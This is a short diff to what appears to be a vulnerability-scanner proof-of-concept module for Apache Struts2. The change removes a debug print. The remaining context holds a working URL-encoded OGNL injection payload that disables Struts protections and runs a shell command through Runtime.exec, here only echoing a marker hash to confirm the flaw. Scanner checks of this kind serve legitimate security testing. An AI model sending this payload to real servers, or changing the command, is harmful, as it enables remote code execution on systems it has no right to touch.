@@ -33,7 +33,6 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))      
             payload = {'''redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo 92933839f1efb2da9a4799753ee8d79c%27%29.getInputStream%28%29%29%7D''':''}
             request = requests.get('{target}/index.action'.format(target=self.target),params=payload)
-            print (request.url)
             r = request.text
             if '92933839f1efb2da9a4799753ee8d79c' in r:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
